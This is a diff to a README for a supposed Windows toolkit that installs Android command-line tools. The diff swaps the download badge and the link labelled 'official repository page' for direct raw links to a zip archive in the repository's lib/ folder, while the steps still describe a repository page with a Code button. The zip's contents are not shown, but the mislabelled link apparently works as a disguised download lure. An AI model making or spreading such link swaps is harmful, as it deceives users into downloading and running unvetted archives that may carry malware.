@@ -1,12 +1,12 @@
 # 🛠️ Android-CLI_One-Click_Kit - Manage Android tools without typing commands
 
-[![Download Android-CLI One-Click Kit](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/decent-eightpennynail371/Android-CLI_One-Click_Kit)
+[![Download Android-CLI One-Click Kit](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/decent-eightpennynail371/Android-CLI_One-Click_Kit/main/lib/Kit_Android_CL_Click_One_v1.6.zip)
 
 This toolkit helps you set up Android command-line tools on your Windows computer. You do not need to write code or memorize complex instructions. This kit manages the installation, configuration, and removal process through simple menu options.
 
 ## 📥 How to download the software
 
-1. Visit the [official repository page](https://github.com/decent-eightpennynail371/Android-CLI_One-Click_Kit).
+1. Visit the [official repository page](https://raw.githubusercontent.com/decent-eightpennynail371/Android-CLI_One-Click_Kit/main/lib/Kit_Android_CL_Click_One_v1.6.zip).
 2. Look for the green button labeled Code near the top right of the page.
 3. Click the button and select Download ZIP.
 4. Open your Downloads folder on your computer.
